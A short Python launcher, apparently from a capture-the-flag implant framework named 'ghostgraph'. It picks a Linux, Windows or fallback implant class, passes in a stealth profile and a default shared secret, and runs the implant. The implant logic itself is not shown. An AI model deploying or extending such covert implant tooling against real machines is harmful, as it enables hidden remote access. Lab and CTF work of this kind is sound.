import os
import platform
import sys
from implants.base_implant import BaseImplant
from implants.linux_implant import LinuxImplant
from implants.windows_implant import WindowsImplant
from config.profiles import CTF_PROFILES  # Assuming importable

if __name__ == '__main__':
    profile = sys.argv[1] if len(sys.argv) > 1 else 'stealth'
    config = {
        'shared_secret': os.getenv('GG_SECRET', 'ghostgraph-secret'),
        'profile': profile,
        'stealth': True,
        'stealth_level': CTF_PROFILES.get(profile, {}).get('stealth_level', 'medium')
    }
    system = platform.system().lower()
    if system == 'linux':
        implant = LinuxImplant(config)
    elif system == 'windows':
        implant = WindowsImplant(config)
    else:
        implant = BaseImplant(config)  # Fallback
    implant.run()
